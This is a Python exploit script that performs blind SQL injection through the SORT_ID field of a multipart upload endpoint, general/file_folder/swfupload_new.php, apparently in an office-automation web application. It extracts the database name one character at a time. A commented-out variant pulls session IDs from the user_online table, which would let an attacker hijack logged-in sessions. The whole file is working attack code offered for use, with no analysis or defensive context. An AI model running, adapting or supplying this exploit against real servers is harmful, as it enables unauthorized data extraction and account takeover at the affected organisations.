import requests,re,urllib3,sys
from hashlib import md5
import binascii
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
l=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_','-','(',')']
def Hex_encoding(string):
    Hex=binascii.b2a_hex(string.encode())
    return "0x"+Hex.decode()
def exp(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+'general/file_folder/swfupload_new.php'
	headers = {
		'Content-Type': 'multipart/form-data; boundary=----------GFioQpMK0vv2',
		'Accept-Encoding': 'gzip'
	}
	result=''
	for i in range(1,10):
		for j in l:
			ej=Hex_encoding(j)
			data=f'''------------GFioQpMK0vv2\r
Content-Disposition: form-data; name="ATTACHMENT_ID"\r
\r
1\r
------------GFioQpMK0vv2\r
Content-Disposition: form-data; name="ATTACHMENT_NAME"\r
\r
1\r
------------GFioQpMK0vv2\r
Content-Disposition: form-data; name="FILE_SORT"\r
\r
2\r
------------GFioQpMK0vv2\r
Content-Disposition: form-data; name="SORT_ID"\r
\r
0 RLIKE (SELECT  (CASE WHEN (substr(database(),{i},1)={ej}) THEN 1 ELSE 0x28 END))\r
------------GFioQpMK0vv2--'''
			# print(data)
			response=requests.post(url=url, headers=headers,data=data,verify=False,timeout=5)
			if '"status":1' in response.text:
				result+=j
				print(result)
				break
# def session(baseurl):
# 	if baseurl[-1]=='/':
# 		baseurl=baseurl
# 	else:
# 		baseurl=baseurl+"/"
# 	url=baseurl+'general/file_folder/swfupload_new.php'
# 	headers = {
# 		'Content-Type': 'multipart/form-data; boundary=----------GFioQpMK0vv2',
# 		'Accept-Encoding': 'gzip'
# 	}
# 	result=''
# 	for i in range(1,10):
# 		for j in l:
# 			ej=Hex_encoding(j)
# 			data=f'''------------GFioQpMK0vv2\r
# Content-Disposition: form-data; name="ATTACHMENT_ID"\r
# \r
# 1\r
# ------------GFioQpMK0vv2\r
# Content-Disposition: form-data; name="ATTACHMENT_NAME"\r
# \r
# 1\r
# ------------GFioQpMK0vv2\r
# Content-Disposition: form-data; name="FILE_SORT"\r
# \r
# 2\r
# ------------GFioQpMK0vv2\r
# Content-Disposition: form-data; name="SORT_ID"\r
# \r
# 0 RLIKE (SELECT  (CASE WHEN (substr((select SID from user_online limit 0,1),{i},1)={ej}) THEN 1 ELSE 0x28 END))\r
# ------------GFioQpMK0vv2--'''
# 			print(i)
# 			response=requests.post(url=url, headers=headers,data=data,verify=False,timeout=5)
# 			if '"status":1' in response.text:
# 				result+=j
# 				print(result)
# 				break
if __name__ == '__main__':
	url=sys.argv[1]
	exp(url)